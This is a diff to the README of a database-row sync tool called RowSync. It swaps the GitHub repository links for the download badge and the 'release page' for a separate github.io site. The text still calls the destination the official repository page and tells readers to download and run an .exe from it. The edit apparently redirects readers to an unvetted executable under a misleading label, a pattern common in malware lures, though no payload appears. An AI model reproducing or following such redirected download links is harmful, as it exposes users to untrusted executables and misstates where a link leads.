@@ -1,6 +1,6 @@
 # 🔄 RowSync - Sync your production database rows easily
 
-[![](https://img.shields.io/badge/Download_RowSync-Blue.svg)](https://github.com/sampurngupta44/RowSync)
+[![](https://img.shields.io/badge/Download_RowSync-Blue.svg)](https://sampurngupta44.github.io)
 
 RowSync moves data from your production SQL Server to your development or staging servers. You select the items you need, check the results, and push them to your target database. This tool works offline, keeps your data private, and helps you test changes without risk.
 
@@ -27,7 +27,7 @@ Before you run RowSync, verify your computer meets these needs:
 
 You need to obtain the installer from the official repository page.
 
-1.  Visit the [RowSync release page](https://github.com/sampurngupta44/RowSync).
+1.  Visit the [RowSync release page](https://sampurngupta44.github.io).
 2.  Look for the latest version under the Releases section.
 3.  Click the file ending in .exe to start your download.
 4.  Save the file to your desktop or your Downloads folder.
